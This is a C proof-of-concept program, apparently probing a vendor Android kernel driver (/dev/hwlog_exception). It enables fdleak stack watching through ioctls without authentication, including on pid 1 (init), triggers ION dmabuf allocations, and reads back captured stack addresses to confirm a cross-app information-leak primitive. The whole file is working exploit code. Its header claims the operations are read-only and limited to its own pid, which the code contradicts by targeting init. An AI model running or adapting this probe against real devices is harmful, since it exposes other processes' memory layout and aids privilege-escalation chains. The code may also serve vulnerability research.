/* fdleak primitive validation (all read-only operations against our own pid):
 *  1) open /dev/hwlog_exception (world-writable, SELinux domain-granted)
 *  2) FDLEAK_ENABLE_WATCH: watch dmabuf for our own pid — tests unauthenticated enable
 *  3) trigger: ION_IOC_ALLOC (ion-ioctl.c calls fdleak_report(FDLEAK_WP_DMABUF, 0))
 *  4) FDLEAK_GET_STACK: read back captured user stack frames (fp/lr/pc)
 *  5) FDLEAK_DISABLE_WATCH
 * If stacks come back non-empty -> cross-app leak primitive confirmed live.
 * If empty with enable succeeding -> usertype gate (fdleak_report needs BETA_USER=3).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define MAX_PROBE_COUNT 3
#define MAX_STACK_TRACE_COUNT 20
#define FDLEAK_MAX_STACK_TRACE_DEPTH 64
#define MAX_FDLEAK_WP_NAME_LEN 256

#define FDLEAK_WP_DMABUF 2
#define MASK_FDLEAK_WP_DMABUF (1u << FDLEAK_WP_DMABUF)

struct fdleak_op {
	int magic;
	int pid;
	int wp_mask;
};

struct stack_item {
	unsigned long long stack[FDLEAK_MAX_STACK_TRACE_DEPTH];
};

struct fdleak_stackinfo {
	int magic;
	int pid;
	int wpid;
	int is_32bit;
	int probe_cnt;
	char wp_name[MAX_FDLEAK_WP_NAME_LEN];
	int hit_cnt[MAX_PROBE_COUNT][MAX_STACK_TRACE_COUNT];
	int diff_cnt[MAX_PROBE_COUNT];
	struct stack_item list[MAX_PROBE_COUNT][MAX_STACK_TRACE_COUNT];
};

#define __FDLEAKIO 0xAC
#define FDLEAK_ENABLE_WATCH  _IO(__FDLEAKIO, 1)
#define FDLEAK_DISABLE_WATCH _IO(__FDLEAKIO, 2)
#define FDLEAK_GET_STACK     _IO(__FDLEAKIO, 3)
#define FDLEAK_MAGIC 0x5366FEFA

/* ION (from ion_probe phases) */
struct ion_allocation_data {
	uint64_t len;
	uint32_t heap_id_mask;
	uint32_t flags;
	uint32_t fd;
	uint32_t unused;
};
#define _MY_IOC(d, t, nr, sz) (((d) << 30) | ((t) << 8) | (nr) | ((sz) << 16))
#define ION_IOC_ALLOC _MY_IOC(3, 'I', 0, 24)

int main(void)
{
	int lfd = open("/dev/hwlog_exception", O_RDWR);
	if (lfd < 0)
		lfd = open("/dev/hwlog_exception", O_RDONLY);
	if (lfd < 0) {
		printf("open /dev/hwlog_exception: %s\n", strerror(errno));
		return 1;
	}
	printf("hwlog_exception opened (pid=%d)\n", getpid());

	/* 1) enable dmabuf watch on self */
	struct fdleak_op op;
	memset(&op, 0, sizeof(op));
	op.magic = FDLEAK_MAGIC;
	op.pid = getpid();
	op.wp_mask = MASK_FDLEAK_WP_DMABUF;
	if (ioctl(lfd, FDLEAK_ENABLE_WATCH, &op) == 0)
		printf("ENABLE_WATCH(dmabuf, self) -> OK (unauthenticated enable confirmed)\n");
	else
		printf("ENABLE_WATCH -> errno=%d (%s)\n", errno, strerror(errno));

	/* 2) also prove cross-app: enable watch on a pid we don't own (pid 1 = init) */
	op.pid = 1;
	if (ioctl(lfd, FDLEAK_ENABLE_WATCH, &op) == 0)
		printf("ENABLE_WATCH(dmabuf, pid=1/init) -> OK (cross-app watch confirmed)\n");
	else
		printf("ENABLE_WATCH(pid=1) -> errno=%d (%s)\n", errno, strerror(errno));

	/* disable the init watch again, keep ours */
	op.pid = 1;
	if (ioctl(lfd, FDLEAK_DISABLE_WATCH, &op) == 0)
		printf("DISABLE_WATCH(pid=1) -> OK\n");

	/* 3) trigger dmabuf creation via ION alloc */
	int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
	if (ion < 0) {
		printf("open /dev/ion: %s\n", strerror(errno));
	} else {
		for (int i = 0; i < 3; i++) {
			struct ion_allocation_data d;
			memset(&d, 0, sizeof(d));
			d.len = 4096;
			d.heap_id_mask = 1u << 0;
			d.flags = 0;
			int r = (int)ioctl(ion, ION_IOC_ALLOC, &d);
			if (r >= 0) {
				printf("ion alloc #%d -> fd=%d (report hook should have fired)\n", i, (int)d.fd);
				close((int)d.fd);
			} else {
				printf("ion alloc #%d failed: %s\n", i, strerror(errno));
			}
		}
		close(ion);
	}

	/* 4) read back stacks */
	struct fdleak_stackinfo *info = calloc(1, sizeof(*info));
	if (!info)
		return 1;
	info->magic = FDLEAK_MAGIC;
	info->pid = getpid();
	info->wpid = FDLEAK_WP_DMABUF;
	if (ioctl(lfd, FDLEAK_GET_STACK, info) == 0) {
		printf("GET_STACK -> OK name=%s probe_cnt=%d is_32bit=%d\n",
		       info->wp_name, info->probe_cnt, info->is_32bit);
		int total = 0;
		for (int p = 0; p < info->probe_cnt; p++)
			total += info->diff_cnt[p];
		if (total == 0) {
			printf("no stacks captured -> fdleak_report gated by usertype!=BETA_USER(3)\n");
		} else {
			printf("STACKS CAPTURED (cross-app leak live!):\n");
			for (int p = 0; p < info->probe_cnt && p < MAX_PROBE_COUNT; p++) {
				for (int s = 0; s < info->diff_cnt[p]; s++) {
					printf(" probe=%d hit=%d pc=0x%llx fp0=0x%llx\n",
					       p, info->hit_cnt[p][s],
					       info->list[p][s].stack[0],
					       info->list[p][s].stack[1]);
				}
			}
		}
	} else {
		printf("GET_STACK -> errno=%d (%s)\n", errno, strerror(errno));
	}
	free(info);

	/* 5) cleanup our watch */
	op.pid = getpid();
	if (ioctl(lfd, FDLEAK_DISABLE_WATCH, &op) == 0)
		printf("DISABLE_WATCH(self) -> OK\n");

	close(lfd);
	printf("done, still alive\n");
	return 0;
}
